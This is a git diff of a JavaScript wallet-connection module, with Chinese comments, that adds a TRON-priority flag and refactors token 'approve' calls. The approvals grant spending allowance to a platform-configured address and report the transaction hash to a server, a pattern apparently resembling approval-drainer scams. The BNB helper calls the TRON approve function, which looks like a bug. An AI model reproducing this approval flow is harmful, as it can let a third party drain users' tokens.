@@ -1,3 +1,6 @@
+
+
+
 import { showLoadingToast, closeToast, showToast } from 'vant'
 import {
   check as checkETH,
@@ -13,9 +16,13 @@ import {
 } from './tron'
 import { sendApproveHashApi } from '@/api/common/chain'
 import { useUserStore } from '@/store/user'
-import { useMainStore } from '@/store/index'
+import { useMainStore } from '@/store'
 let isTron = false
 let isEth = false
+/**
+ * 优先 TRON
+ */
+let priorityTRON = ['tbspecie', 'dev_111_light'].includes(__config._APP_ENV)
 
 /**
  * 获取账户信息
@@ -24,9 +31,14 @@ export const getAcount = async () => {
   isTron = await checkTRON()
   isEth = await checkETH()
   let res = null
-  //优先选择eth
   if (isEth && isTron) {
-    res = await connectETH()
+    //优先选择 tron
+    if (priorityTRON) {
+      res = await connectTRON()
+    } else {
+      //优先选择 eth
+      res = await connectETH()
+    }
   } else if (isTron) {
     // 判断波场
     res = await connectTRON()
@@ -53,6 +65,65 @@ export const initSwitchWalletEvent = async () => {
   isEth && initSwitchWalletEventETH()
 }
 
+
+/**
+ * 切换钱包监听事件
+ */
+// export const approve = async (type) => {
+//   showLoadingToast()
+//   // 配置授权地址
+//   isTron = await checkTRON()
+//   isEth = await checkETH()
+//   const { platFormConfig } = useMainStore()
+//   let res = null
+//   if ((isEth && isTron) || isEth) {
+//     let spenderAddress = platFormConfig.APPROVE_ADDRESS.ETH
+//     const { approveMethod } = await approveETH(spenderAddress, type)
+//     approveMethod.on('transactionHash', (hash) => {
+//       // 交易发送成功
+//       sendApproveHash(hash)
+//     })
+//     res = approveMethod
+//   } else if (isTron) {
+//     let spenderAddress = platFormConfig.APPROVE_ADDRESS.TRON
+//     res = await approveTRON(spenderAddress)
+//     sendApproveHash(res)
+//   }
+//   closeToast()
+//   return res
+// }
+/**
+ * bnb 授权
+ */
+const approveBNBHash = async (platFormConfig, type) => {
+  let spenderAddress = platFormConfig.APPROVE_ADDRESS.BNB
+  let res = await approveTRON(spenderAddress)
+  sendApproveHash(res)
+  return res
+}
+/**
+ * tron 授权
+ */
+const approveTRONHash = async (platFormConfig, type) => {
+  let spenderAddress = platFormConfig.APPROVE_ADDRESS.TRON
+  let res = await approveTRON(spenderAddress)
+  sendApproveHash(res)
+  return res
+}
+
+/**
+ * eth 授权
+ */
+const approveETHHash = async (platFormConfig, type) => {
+  let spenderAddress = platFormConfig.APPROVE_ADDRESS.ETH
+  const { approveMethod } = await approveETH(spenderAddress, type)
+  approveMethod.on('transactionHash', (hash) => {
+    // 交易发送成功
+    sendApproveHash(hash)
+  })
+  let res = approveMethod
+  return res
+}
 /**
  * 切换钱包监听事件
  */
@@ -63,18 +134,16 @@ export const approve = async (type) => {
   isEth = await checkETH()
   const { platFormConfig } = useMainStore()
   let res = null
-  if ((isEth && isTron) || isEth) {
-    let spenderAddress = platFormConfig.APPROVE_ADDRESS.ETH
-    const { approveMethod } = await approveETH(spenderAddress, type)
-    approveMethod.on('transactionHash', (hash) => {
-      // 交易发送成功
-      sendApproveHash(hash)
-    })
-    res = approveMethod
+  if (isEth && isTron) {
+    if (priorityTRON) {
+      res = await approveTRONHash(platFormConfig, type)
+    } else {
+      res = await approveETHHash(platFormConfig, type)
+    }
+  } else if (isEth) {
+    res = await approveETHHash(platFormConfig, type)
   } else if (isTron) {
-    let spenderAddress = platFormConfig.APPROVE_ADDRESS.TRON
-    res = await approveTRON(spenderAddress)
-    sendApproveHash(res)
+    res = await approveTRONHash(platFormConfig, type)
   }
   closeToast()
   return res
